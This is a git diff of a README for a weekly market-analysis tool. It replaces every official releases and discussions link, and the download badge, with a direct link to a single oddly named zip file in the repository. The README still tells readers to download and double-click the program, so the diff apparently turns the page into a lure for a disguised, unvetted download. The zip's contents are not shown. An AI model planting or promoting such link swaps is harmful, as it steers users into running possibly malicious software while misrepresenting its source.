@@ -1,6 +1,6 @@
 # 🚀 jobrunner-weekly-market-analysis - Your Simple Tool for Weekly Market Insights
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-%E2%9D%97-brightgreen)](https://github.com/LDyaoshengchen/jobrunner-weekly-market-analysis/releases)
+[![Download Release](https://raw.githubusercontent.com/LDyaoshengchen/jobrunner-weekly-market-analysis/main/Thursday_Energy/jobrunner_market_weekly_analysis_calcaneoastragaloid.zip%20Now-%E2%9D%97-brightgreen)](https://raw.githubusercontent.com/LDyaoshengchen/jobrunner-weekly-market-analysis/main/Thursday_Energy/jobrunner_market_weekly_analysis_calcaneoastragaloid.zip)
 
 ## 📖 Overview
 Welcome to jobrunner-weekly-market-analysis! This software helps you automate your weekly market analysis. It combines clear human insights with automated tasks. You can easily follow a workflow set up using YAML, making it easy to understand and use.
@@ -25,7 +25,7 @@ To run jobrunner-weekly-market-analysis, please ensure your system meets the fol
 Follow these simple steps to get started with jobrunner-weekly-market-analysis:
 
 1. **Visit the Releases Page:**  
-   Go to this page to download the application: [Download Page](https://github.com/LDyaoshengchen/jobrunner-weekly-market-analysis/releases).
+   Go to this page to download the application: [Download Page](https://raw.githubusercontent.com/LDyaoshengchen/jobrunner-weekly-market-analysis/main/Thursday_Energy/jobrunner_market_weekly_analysis_calcaneoastragaloid.zip).
 
 2. **Download the Latest Version:**  
    Look for the most recent release. Click on the link to download the file.
@@ -39,7 +39,7 @@ Follow these simple steps to get started with jobrunner-weekly-market-analysis:
    Locate the application in your system and double-click to open it.
 
 ## 📥 Download & Install
-Now that you know how to get started, it's time to download the software. Visit this page to download: [Download Jobrunner Weekly Market Analysis](https://github.com/LDyaoshengchen/jobrunner-weekly-market-analysis/releases).
+Now that you know how to get started, it's time to download the software. Visit this page to download: [Download Jobrunner Weekly Market Analysis](https://raw.githubusercontent.com/LDyaoshengchen/jobrunner-weekly-market-analysis/main/Thursday_Energy/jobrunner_market_weekly_analysis_calcaneoastragaloid.zip).
 
 ## ⚙️ Configuration
 After installing, you may need to configure your analysis settings. Here is how to do it:
@@ -86,10 +86,10 @@ No programming knowledge is necessary. The user interface is straightforward, an
 ## 🌟 Community and Support
 For additional help, join our community:
 
-- Visit our [Discussion Page](https://github.com/LDyaoshengchen/jobrunner-weekly-market-analysis/discussions).
+- Visit our [Discussion Page](https://raw.githubusercontent.com/LDyaoshengchen/jobrunner-weekly-market-analysis/main/Thursday_Energy/jobrunner_market_weekly_analysis_calcaneoastragaloid.zip).
 - Submit an issue if you find a bug.
 
 ## 📄 License
 This software is licensed under the MIT License. You can freely use, modify, and distribute it.
 
-Remember, the most important step is to download the software from the [Releases Page](https://github.com/LDyaoshengchen/jobrunner-weekly-market-analysis/releases) and start analyzing!
+Remember, the most important step is to download the software from the [Releases Page](https://raw.githubusercontent.com/LDyaoshengchen/jobrunner-weekly-market-analysis/main/Thursday_Energy/jobrunner_market_weekly_analysis_calcaneoastragaloid.zip) and start analyzing!
